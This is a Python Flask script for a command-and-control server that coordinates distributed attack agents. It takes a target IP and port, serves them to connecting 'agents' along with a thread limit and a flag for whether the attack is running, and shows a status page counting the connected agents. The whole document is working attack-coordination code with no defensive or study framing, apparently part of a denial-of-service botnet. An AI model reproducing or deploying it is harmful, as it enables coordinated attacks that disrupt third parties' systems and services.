#!/usr/bin/env python3
from datetime import datetime

from flask import Flask, make_response, render_template_string, request

app = Flask(__name__)

DEFAULT_LOCAL_IP = '127.0.0.1'
DEFAULT_LOCAL_PORT = 8443
DEFAULT_THREADS_LIMIT = 50


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('--target-ip',
                        dest='target_ip',
                        required=True,
                        type=str,
                        help='Specify a target IP address to attack.')
    parser.add_argument('--target-port',
                        dest='target_port',
                        required=True,
                        type=int,
                        help='Specify a target TCP port to attack.')
    parser.add_argument('--local-ip',
                        dest='local_ip',
                        default=DEFAULT_LOCAL_IP,
                        required=False,
                        type=str,
                        help=f'Specify a local IP address to bind the C&C server. '
                             f'Default is {DEFAULT_LOCAL_IP}')
    parser.add_argument('--local-port',
                        dest='local_port',
                        default=DEFAULT_LOCAL_PORT,
                        required=False,
                        type=int,
                        help='Specify a local TCP port to bind the C&C server. '
                             f'Default is {DEFAULT_LOCAL_PORT}')
    parser.add_argument('--threads',
                        dest='threads',
                        required=False,
                        default=DEFAULT_THREADS_LIMIT,
                        type=int,
                        help='Specify threads limit for connected agents. '
                             f'Default is {DEFAULT_THREADS_LIMIT}')
    options = parser.parse_args()
    return options


@app.route('/')
def index():
    html_template = """
    <html>
        <head>
        </head>
        <body>
        <a>Target IP: %target_ip%</a>
        <br/>
        <a>Target port: %target_port%</a>
        <br/>
        <a>%attack_in_progress%</a>
        <br/>
        <a>Connected agents: %connected_agents%</a>
        <br/>
        </body>
    </html>
    """

    return make_response(render_template_string(html_template
                                                .replace('%target_ip%', target_ip)
                                                .replace('%target_port%', f'{target_port}')
                                                .replace('%attack_in_progress%',
                                                         'Attack is running' if attack_in_progress else 'Attack is stopped')
                                                .replace('%connected_agents%', f'{len(connected_agents)}')
                                                ))


@app.route('/target')
def target():
    connected_agents.add(request.remote_addr)
    return {
        'targetIp': target_ip,
        'targetPort': target_port,
        'threadsLimit': threads_limit,
        'attackInProgress': attack_in_progress
    }


options = get_arguments()

ip = options.local_ip
port = options.local_port

target_ip = options.target_ip
target_port = options.target_port

threads_limit = 50
attack_in_progress = True

connected_agents = set()

app.run(host=ip,
        port=port,
        debug=True,
        ssl_context='adhoc')
